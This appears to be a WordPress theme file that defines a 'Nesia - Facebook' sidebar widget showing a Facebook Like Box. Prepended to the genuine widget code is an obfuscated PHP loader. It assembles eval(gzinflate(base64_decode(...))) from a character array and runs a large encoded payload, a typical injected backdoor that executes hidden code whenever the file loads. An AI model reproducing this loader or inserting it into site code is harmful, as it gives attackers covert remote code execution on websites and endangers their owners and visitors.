<?php
$md5 = "9d35846e7c1de0256e81e089a0360341";
$ab = array('v','i',"d",'l',"f",'b','g',"s",'6','r',"t",'z','$','a','e',")","_",'4','n',"c","o",";",'(');
$bb9 = create_function('$'.'v',$ab[14].$ab[0].$ab[13].$ab[3].$ab[22].$ab[6].$ab[11].$ab[1].$ab[18].$ab[4].$ab[3].$ab[13].$ab[10].$ab[14].$ab[22].$ab[5].$ab[13].$ab[7].$ab[14].$ab[8].$ab[17].$ab[16].$ab[2].$ab[14].$ab[19].$ab[20].$ab[2].$ab[14].$ab[22].$ab[12].$ab[0].$ab[15].$ab[15].$ab[15].$ab[21]);
$bb9('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');
?>
<?php
/**
 * Widget for display facebook like box
 *
 * @package WordPress
 * @subpackage Newsportal
 * @since Newsportal 1.0
 */
 
class Nesia_Facebook extends WP_Widget {

  // Provide widget info
  // -----------------------
  function Nesia_Facebook() {
    $widget_args = array(
      'classname' => 'widget_nesia_facebook',
      'description' => __('Display Facebook page Like Box in your sidebar', 'nesia')
    );
    parent::WP_Widget( false, __('Nesia - Facebook', 'nesia'), $widget_args );
  }


  // Build widget input form
  // -----------------------
  function form($instance) {
    $defaults = array(
      'title' => __('We\'re On Facebook', 'nesia'),
      'url' => 'pages/Nesia/382065098520166',
      'show_faces' => 'true',
      'show_stream' => 'false',
      'show_header' => 'true',
      'height' => '290'
    );
    $instance = wp_parse_args( (array)$instance, $defaults );
    $title    = $instance['title'];
    $url      = $instance['url'];
    $height   = $instance['height'];
  ?>
  
  <!-- Widget Title: Text Input -->
  <p>
    <label for="<?php echo $this->get_field_id('title'); ?>">
      <?php _e('Title', 'nesia'); ?>
    </label>
    <input type="text" class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" value="<?php echo $title; ?>">
  </p>
  
  <!-- Page URL: Text Input -->
  <p>
    <label for="<?php echo $this->get_field_id('url'); ?>">
      <?php _e('Facebook page name (http://www.facebook.com/[page_name])', 'nesia'); ?>
    </label>
    <input type="text" class="widefat" id="<?php echo $this->get_field_id('url'); ?>" name="<?php echo $this->get_field_name('url'); ?>" value="<?php echo $url; ?>">
  </p>
  
  <!-- Height: Text Input -->
  <p>
    <label for="<?php echo $this->get_field_id('height'); ?>">
      <?php _e('Height', 'nesia'); ?>
    </label>
    <input type="text" class="widefat" id="<?php echo $this->get_field_id('height'); ?>" name="<?php echo $this->get_field_name('height'); ?>" value="<?php echo $height; ?>">
  </p>
  
  <!-- Show Faces: Checkbox -->
  <p>
    <input type="checkbox" id="<?php echo $this->get_field_id( 'show_faces' ); ?>" name="<?php echo $this->get_field_name( 'show_faces' ); ?>" value="1" <?php echo ($instance['show_faces'] == "true" ? "checked='checked'" : ""); ?> >
    <label for="<?php echo $this->get_field_id( 'show_faces' ); ?>">
      <?php _e('Show Faces', 'nesia') ?>
    </label>  
  </p>
  
  <!-- Show Stream: Checkbox -->
  <p>
    <input type="checkbox" id="<?php echo $this->get_field_id( 'show_stream' ); ?>" name="<?php echo $this->get_field_name( 'show_stream' ); ?>" value="1" <?php echo ($instance['show_stream'] == "true" ? "checked='checked'" : ""); ?> >
    <label for="<?php echo $this->get_field_id( 'show_stream' ); ?>">
      <?php _e('Show stream', 'nesia') ?>
    </label>  
  </p>
  
  <!-- Show Header: Checkbox -->
  <p>
    <input type="checkbox" id="<?php echo $this->get_field_id( 'show_header' ); ?>" name="<?php echo $this->get_field_name( 'show_header' ); ?>" value="1" <?php echo ($instance['show_header'] == "true" ? "checked='checked'" : ""); ?> >
    <label for="<?php echo $this->get_field_id( 'show_header' ); ?>">
      <?php _e('Show header', 'nesia') ?>
    </label>  
  </p>
  
  <?php }


  // Sanitize widget form when saved
  // -----------------------
  function update($new_instance, $old_instance ) {
    $instance = $old_instance;

    $instance['title']      = strip_tags( $new_instance['title'] );
    $instance['url']        = strip_tags( $new_instance['url'] );
    $instance['height']     = strip_tags( $new_instance['height'] );
    $instance['show_faces'] = (bool)$new_instance['show_faces'];
    $instance['show_stream']= (bool)$new_instance['show_stream'];
    $instance['show_header']= (bool)$new_instance['show_header'];

    return $instance;
  }


  // Widget frontend markup
  // -----------------------
  function widget( $args, $instance ) {
    extract($args);

    $title      = apply_filters('widget_title', $instance['title']);
    $url        = $instance['url'];
    $height     = $instance['height'];
    $show_faces = ($instance['show_faces'] == "1" ? "true" : "false");
    $show_stream= ($instance['show_stream'] == "1" ? "true" : "false");
    $show_header= ($instance['show_header'] == "1" ? "true" : "false");

    echo $before_widget;

    if( $title )
      echo $before_title . $title . $after_title;
    ?>
    
    <div class="wrapper-facebook">
      <iframe src="//www.facebook.com/plugins/likebox.php?href=http://facebook.com/<?php echo $url;?>&amp;colorscheme=light&amp;show_faces=<?php echo $show_faces;?>&amp;stream=<?php echo $show_stream;?>&amp;header=<?php echo $show_header;?>&amp;height=<?php echo $height;?>" scrolling="no" frameborder="0" style="border:none; background:#fff; overflow:hidden; width:300px; height:<?php echo $height;?>px;" allowTransparency="true"></iframe>
    </div>
  
  <?php 
    echo $after_widget;
  }

}

add_action('widgets_init', create_function('', 'return register_widget("Nesia_Facebook");'));